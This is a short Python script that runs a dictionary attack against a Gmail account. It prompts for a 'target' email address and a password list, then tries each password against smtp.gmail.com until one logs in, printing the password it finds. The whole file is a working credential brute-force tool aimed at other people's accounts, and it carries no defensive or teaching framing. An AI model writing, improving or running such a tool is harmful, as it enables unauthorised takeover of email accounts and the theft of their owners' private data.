import smtplib

smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter targets email address: ")
passwordf = input("Enter Dictionary File: ")

print('\n')
file = open(passwordf, 'r')

for password in file:
    password = password.strip('\n')

    try:
        smtpserver.login(user, password)
        print("[+] password found!: %s" % password)
        break
    except smtplib.SMTPAuthenticationError:
        print("[-] wrong password defined: " + password)

input()